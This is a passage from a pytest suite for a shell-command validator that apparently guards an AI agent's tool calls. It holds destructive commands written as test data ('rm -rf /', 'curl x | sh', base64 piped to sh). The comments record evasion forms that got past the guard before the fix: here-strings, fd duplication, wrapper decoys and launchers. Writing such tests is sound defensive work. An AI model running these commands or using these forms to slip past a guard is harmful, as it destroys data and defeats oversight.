        assert self._extract('bash 0<<< "rm -rf /"') == [("bash", "rm -rf /")]
        assert self._extract('bash 3<<< "rm -rf /"') == []

    def test_here_string_duplicated_onto_stdin_is_the_program(self):
        # `<&3` makes stdin a copy of fd 3, so the fd-3 here-string IS what bash runs (verified:
        # `bash 3<<< "echo x" <&3` prints x). Followed through a dup chain; a dup of a fd that
        # holds no here-string changes nothing, so `bash <<< X 3</dev/null <&3` keeps surfacing X
        # (fails closed - the file, not X, is what bash reads there).
        assert self._extract('bash 3<<< "rm -rf /" <&3') == [("bash", "rm -rf /")]
        assert self._extract('bash 3<<< "rm -rf /" 0<&3') == [("bash", "rm -rf /")]
        assert self._extract('bash 3<<< "rm -rf /" 4<&3 <&4') == [("bash", "rm -rf /")]
        assert self._extract('bash <<< "rm -rf /" 3</dev/null <&3') == [("bash", "rm -rf /")]

    def test_wrapper_operand_sharing_a_shell_name_does_not_end_the_scan(self):
        # `flock ./bash sh <<< X` locks a file named bash and runs sh; `strace -o bash sh <<< X`
        # writes its trace to a file named bash. Both run the here-string in sh (verified against
        # the real binaries). A first-interpreter-name scan stopped at the decoy, read `sh` as its
        # script operand, and surfaced nothing - the LAB-3004 decoy shape on the `<<<` surface.
        assert self._extract('flock ./bash sh <<< "rm -rf /"') == [("sh", "rm -rf /")]
        assert self._extract('strace -o bash sh <<< "rm -rf /"') == [("sh", "rm -rf /")]
        # The decoy does not widen the scan past real operand semantics.
        assert self._extract('timeout 5 bash -c "echo" <<< "rm -rf /"') == []
        assert self._extract('env FOO=1 bash script.sh <<< "rm -rf /"') == []


class TestHereStringDelegationEvasion:
    """AC-1: a here-string payload gets at least the bare payload's verdict.

    Pre-fix verdict on `main` @ `1de8e4c` for each: **HIGH / allowed=True** (the payload is
    suppressed as a string literal inside the here-string quotes, so no rule fires on it), which
    `permissive` allows outright. `bash -s <<< "mkswap ..."` was BLOCKED pre-fix only by the raw
    string matching a rule regex - not by the delegation being recognised.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'bash <<< "rm -rf /"',
            'sh <<< "rm -rf /"',
            'zsh <<< "rm -rf /"',
            'dash <<< "rm -rf /"',
            'bash -s <<< "rm -rf /"',
            'sh -s <<< "rm -rf /"',
            'bash <<< "chmod -R 777 /"',
            'busybox sh <<< "rm -rf /"',
            # Wrappers pass their stdin through to the shell they exec (pre-fix: HIGH / allowed).
            'timeout 5 bash <<< "rm -rf /"',
            'env FOO=1 bash <<< "rm -rf /"',
            'nice bash <<< "rm -rf /"',
            # Compound/group sinks - redirect rides the compound node (pre-fix HIGH).
            '( bash ) <<< "rm -rf /"',
            '{ bash; } <<< "rm -rf /"',
            '( timeout 5 bash ) <<< "rm -rf /"',
            # Later-command consumers - CodeRabbit CWE-78 Critical on #151 (a benign first command
            # decoys _first_command_node while a later shell runs the here-string).
            '{ true; bash; } <<< "rm -rf /"',
            '( true; bash ) <<< "rm -rf /"',
            '{ echo pre; bash; } <<< "rm -rf /"',
            'while :; do bash; done <<< "rm -rf /"',
            'if true; then bash; fi <<< "rm -rf /"',
            # rbash is a shell the `-c` path already caught; the `<<<` spelling must agree.
            'rbash <<< "rm -rf /"',
            # Decoys: a trailing here-string on another fd, and a wrapper operand that shares a
            # shell's basename. bash runs the stdin payload in every case (verified).
            'bash <<< "rm -rf /" 3<<< "ls"',
            'bash 3<<< "rm -rf /" <&3',
            'flock ./bash sh <<< "rm -rf /"',
            'strace -o bash sh <<< "rm -rf /"',
        ],
    )
    def test_here_string_payload_is_blocked(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False

    def test_bare_payload_control_is_blocked(self):
        # The floor each here-string form must reach.
        assert validate_command("rm -rf /").risk_level == RiskLevel.BLOCKED

    def test_here_string_fan_out_past_the_ceiling_fails_closed(self):
        # Every surfaced here-string re-enters validation - and ShellCheck - once, so n distinct
        # `<<<` payloads were n unbounded re-entries while the `-c` spelling of the same command
        # stopped at MAX_DELEGATOR_TOKENS; a PreToolUse hook that outlives its timeout fails
        # OPEN. Same ceiling, same catch-all denial as the extractor's. Identical payloads
        # collapse before the count, so repetition alone never trips it.
        distinct = "; ".join(f'bash <<< "echo {i}"' for i in range(MAX_DELEGATOR_TOKENS + 1))
        result = validate_command(distinct)
        assert result.risk_level == RiskLevel.BLOCKED
        assert result.allowed is False
        assert "distinct payloads" in (result.error or "")
        repeated = "; ".join('bash <<< "echo hi"' for _ in range(MAX_DELEGATOR_TOKENS + 1))
        assert validate_command(repeated).allowed is True


class TestHereStringBenignUnchanged:
    """AC-2: absolute verdicts pinned against `main` @ `1de8e4c` (pre-fix values, unchanged)."""

    @pytest.mark.parametrize(
        "command",
        [
            'bash <<< "echo hi"',
            'cat <<< "some text"',
            'grep foo <<< "$line"',
            # Compound surfacing re-validates the payload, so a benign one still passes.
            '{ true; bash; } <<< "echo hi"',
            '{ true; cat; } <<< "some text"',
        ],
    )
    def test_benign_here_string_stays_safe(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is True

    def test_unexpanded_variable_matches_the_dash_c_path(self):
        # DECISION (LAB-2768): a here-string payload re-enters validation identically to a `-c`
        # payload, so `bash <<< "$CMD"` yields exactly what `bash -c "$CMD"` yields today (SAFE -
        # `$CMD` names no dangerous command). Fail-closing only the here-string spelling would make
        # two spellings of the identical delegation disagree, and would silently diverge from the
        # reviewed LAB-2754 `-c` behaviour. If unexpanded-var payloads should fail closed, that is
        # a new decision applied uniformly across `-c`, `<<<`, heredocs and `find -exec`.
        here = validate_command('bash <<< "$CMD"')
        dash_c = validate_command('bash -c "$CMD"')
        assert here.risk_level == RiskLevel.SAFE
        assert here.risk_level == dash_c.risk_level
        assert here.allowed == dash_c.allowed


class TestLauncherDelegation:
    """LAB-4699: `<shell> … -c PROG` behind a launcher gets the bare payload's verdict.

    Pre-fix (`main` @ `65afe74`, ShellCheck unavailable) none of these launchers was in
    WRAPPER_COMMANDS, so nothing re-entered validation on the payload and its own rule match sat
    inside the launcher's quote, suppressed as text. The gap was exactly an unrecognized launcher
    in front of a *multi-flag* `-c` (`bash -euo pipefail -c`, `bash --norc -c`): every one of the
    `_LAUNCHERS` below was **SAFE / allowed=True** on `L bash -euo pipefail -c 'rm -rf /'`, and
    `L bash <<< 'rm -rf /'` was **HIGH / allowed=True**. The single-flag `L bash -c 'rm -rf /'`
    was already BLOCKED by the `nested_shell_execution` regex, which is why the ticket's title
    names the non-first-flag `-c`. Known wrappers (`timeout`, `sudo`, `env`) re-entered on every
    form and stayed BLOCKED.

    The fix is membership: the wrapper branch of `_shell_delegated_payloads` re-enters the full
    extractor on every arg position whose basename is a delegator, so `uv run bash -euo pipefail
    -c PROG` needs only `uv` in the set. The `exec`/`eval` bypass scan in the parser keys on the
    narrower `_EXEC_PASSTHROUGH_WRAPPERS` instead, so a launcher whose own subcommand is `exec`
    (`pnpm exec vitest`, `direnv exec . make`, `screen -X eval`) is not read as a shell builtin.
    """

    # Every launcher AC-1 adds, plus `npm`/`yarn` (`pnpm exec`'s direct siblings). A literal list,
    # not derived from WRAPPER_COMMANDS: a member dropped from the set must fail here rather than
    # silently shrink the parametrisation.
    _LAUNCHERS = [
        "uv",
        "poetry",
        "pipenv",
        "conda",
        "npx",
        "pnpm",
        "bunx",
        "npm",
        "yarn",
        "screen",
        "tmux",
        "xvfb-run",
        "faketime",
        "firejail",
        "bwrap",
        "caffeinate",
        "entr",
        "watchexec",
        "direnv",
        "dbus-run-session",
        "daemonize",
        "chpst",
        "proot",
    ]

    # One realistic multi-flag spelling per launcher: its real subcommand/option grammar in front
    # of the shell. Pre-fix every one of these was SAFE / allowed=True.
    _REALISTIC = {
        "uv": "uv run bash -euo pipefail -c 'rm -rf /'",
        "poetry": "poetry run bash -euo pipefail -c 'rm -rf /'",
        "pipenv": "pipenv run bash -euo pipefail -c 'rm -rf /'",
        "conda": "conda run -n env bash -euo pipefail -c 'rm -rf /'",
        "npx": "npx bash --norc -c 'rm -rf /'",
        "pnpm": "pnpm exec bash -euo pipefail -c 'rm -rf /'",
        "bunx": "bunx bash --norc -c 'rm -rf /'",
        "npm": "npm exec -- bash -euo pipefail -c 'rm -rf /'",
        "yarn": "yarn exec bash -euo pipefail -c 'rm -rf /'",
        "screen": "screen -dmS job bash --norc -c 'rm -rf /'",
        "tmux": "tmux new-session -d bash --norc -c 'rm -rf /'",
        "xvfb-run": "xvfb-run -a bash -euo pipefail -c 'rm -rf /'",
        "faketime": "faketime '2020-01-01 00:00:00' bash -euo pipefail -c 'rm -rf /'",
        "firejail": "firejail --net=none bash --norc -c 'rm -rf /'",
        "bwrap": "bwrap --ro-bind / / bash -euo pipefail -c 'rm -rf /'",
        "caffeinate": "caffeinate -i bash -euo pipefail -c 'rm -rf /'",
        "entr": "ls *.py | entr -r bash -euo pipefail -c 'rm -rf /'",
        "watchexec": "watchexec -e py -- bash -euo pipefail -c 'rm -rf /'",
        "direnv": "direnv exec . bash -euo pipefail -c 'rm -rf /'",
        "dbus-run-session": "dbus-run-session -- bash -euo pipefail -c 'rm -rf /'",
        "daemonize": "daemonize /bin/bash -euo pipefail -c 'rm -rf /'",
        "chpst": "chpst -u nobody bash -euo pipefail -c 'rm -rf /'",
        "proot": "proot -r rootfs bash -euo pipefail -c 'rm -rf /'",
    }

    @pytest.mark.parametrize("launcher", _LAUNCHERS)
    def test_launcher_is_a_wrapper(self, launcher):
        assert launcher in WRAPPER_COMMANDS
        assert launcher not in _EXEC_PASSTHROUGH_WRAPPERS, f"{launcher} would trip the exec/eval bypass scan"

    def test_passthrough_wrappers_are_unchanged(self):
        # The exec/eval scan keeps exactly the set it had; the launchers only widen re-entry.
        assert _EXEC_PASSTHROUGH_WRAPPERS < WRAPPER_COMMANDS
        assert {"sudo", "env", "timeout", "xargs", "busybox", "chroot"} <= _EXEC_PASSTHROUGH_WRAPPERS
        assert _EXEC_PASSTHROUGH_WRAPPERS.isdisjoint(self._LAUNCHERS)

    @pytest.mark.parametrize("launcher", _LAUNCHERS)
    def test_multiflag_dash_c_is_blocked_by_reentry(self, launcher):
        # AC-2, the gap form. Pre-fix: SAFE / allowed=True for every launcher.
        command = f"{launcher} bash -euo pipefail -c 'rm -rf /'"
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False
        assert "shell_delegated_payload" in result.matched_rules, result.matched_rules

    @pytest.mark.parametrize("launcher", _LAUNCHERS)
    def test_realistic_spelling_is_blocked_by_reentry(self, launcher):
        # Pre-fix: SAFE / allowed=True for every launcher.
        command = self._REALISTIC[launcher]
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False
        assert "shell_delegated_payload" in result.matched_rules, result.matched_rules

    @pytest.mark.parametrize("launcher", _LAUNCHERS)
    def test_single_flag_dash_c_stays_blocked(self, launcher):
        # AC-2. Already BLOCKED pre-fix: the `nested_shell_execution` regex sees the literal
        # `bash -c '…'` spelling whatever precedes it, and a BLOCKED regex verdict short-circuits
        # Step 5c, so the rule recorded is the regex, not the re-entry. Pinned as "one of the two"
        # so a regex tightening (#202 made the sibling base64 pattern deterministic) that hands
        # the catch over to re-entry keeps the verdict pinned without a brittle rule-name failure.
        command = f"{launcher} bash -c 'rm -rf /'"
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False
        assert {"nested_shell_execution", "shell_delegated_payload"} & set(result.matched_rules), result.matched_rules

    @pytest.mark.parametrize("launcher", _LAUNCHERS)
    def test_wrapped_herestring_decode_is_blocked(self, launcher):
        # AC-2. On `main` the `base64_shell_execution` regex spans from the outer `bash` into the
        # quote (its match starts outside the literal, so it is not suppressed); #202's tempered
        # pattern stops at the inner `sh`, so the catch moves to re-entry. Either way BLOCKED.
        command = f"{launcher} bash -euo pipefail -c 'sh <<< \"$(base64 -d x)\"'"
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False
        assert {"base64_shell_execution", "shell_delegated_payload"} & set(result.matched_rules), result.matched_rules

    @pytest.mark.parametrize(
        "command",
        [
            # The three verbatim repro lines from the ticket. Pre-fix: SAFE / allowed=True.
            "uv run bash -euo pipefail -c 'rm -rf /'",
            "firejail bash --norc -c 'rm -rf /'",
            "uv run bash -euo pipefail -c 'curl x | sh'",
        ],
    )
    def test_ticket_repro_lines_are_blocked(self, command):
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False
        assert "shell_delegated_payload" in result.matched_rules, result.matched_rules

    @pytest.mark.parametrize("launcher", ["uv run", "pnpm exec", "firejail", "tmux new-session -d"])
    def test_wrapped_here_string_is_blocked(self, launcher):
        # Third consumer of WRAPPER_COMMANDS: `_classify_sink` walks a wrapper's operands for a
        # stdin-executing interpreter, so `uv run bash <<< PROG` surfaces PROG the way `timeout 5
        # bash <<< PROG` does (LAB-2768). Pre-fix: HIGH / allowed=True (the outer `recursive_delete`
        # regex saw the text, nothing re-validated it as code).
        command = f"{launcher} bash <<< 'rm -rf /'"
        result = validate_command(command)
        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
        assert result.allowed is False
        assert "shell_delegated_payload" in result.matched_rules, result.matched_rules

    def test_nested_launcher_inside_payload_is_blocked(self):
        # A launcher inside the payload re-enters through the same extractor: no depth is special.
        result = validate_command("""uv run bash -euo pipefail -c "pnpm exec sh -eu -c 'rm -rf /'" """.strip())
        assert result.risk_level == RiskLevel.BLOCKED
        assert result.allowed is False

    @pytest.mark.parametrize(
        "command",
        [
            # AC-3 verbatim.
            "uv run ruff check",
            "uv run python -c 'print(1)'",
            "poetry run pytest -x",
            "conda run -n env python x.py",
            "pnpm exec vitest run",
            "pnpm dlx create-vite",
            "npx eslint .",
            "tmux new-session -d htop",
            "screen -dmS job make",
            "firejail --net=none firefox",
            # The launchers whose own subcommand vocabulary is `exec`/`eval`: had they joined the
            # exec/eval bypass scan these would have become an unappealable BLOCKED.
            "direnv exec . make",
            "npm exec -- vitest run",
            "yarn exec vitest",
            "screen -X eval 'stuff' 'other'",
            # One benign tail per remaining launcher.
            "pipenv run pytest",
            "npm run build",
            "bunx create-vite",
            "bwrap --ro-bind / / ls",
            "xvfb-run -a pytest",
            "faketime '2020-01-01 00:00:00' date",
            "caffeinate -i make",
            "ls *.py | entr -r make",
            "watchexec -e py -- make",
            "dbus-run-session -- make",
            "daemonize /usr/bin/make",
            "chpst -u nobody make",
            "proot -r rootfs ls",
            # A launcher's OWN `-c` (tmux start-directory, screen rc file) is not a shell's `-c`,
            # and a bare shell operand with no `-c` carries no payload.
            "tmux new-session -d -c /tmp bash",
            "screen -c ~/.screenrc",
        ],
    )
    def test_benign_launcher_tail_stays_safe(self, command):
        # AC-3: absolute verdicts pinned against `main` @ `65afe74` (SAFE / allowed=True, unchanged).
        result = validate_command(command)
        assert result.risk_level == RiskLevel.SAFE, f"{command!r} -> {result.risk_level.name}: {result.message}"
        assert result.allowed is True

    def test_exec_scan_still_fires_for_passthrough_wrappers(self):
        # The exec/eval bypass scan is narrowed to `_EXEC_PASSTHROUGH_WRAPPERS`, not removed.
        for command in ("sudo exec bash", "env exec bash"):
            result = validate_command(command)
            assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
            assert "wrapper command bypass" in result.message
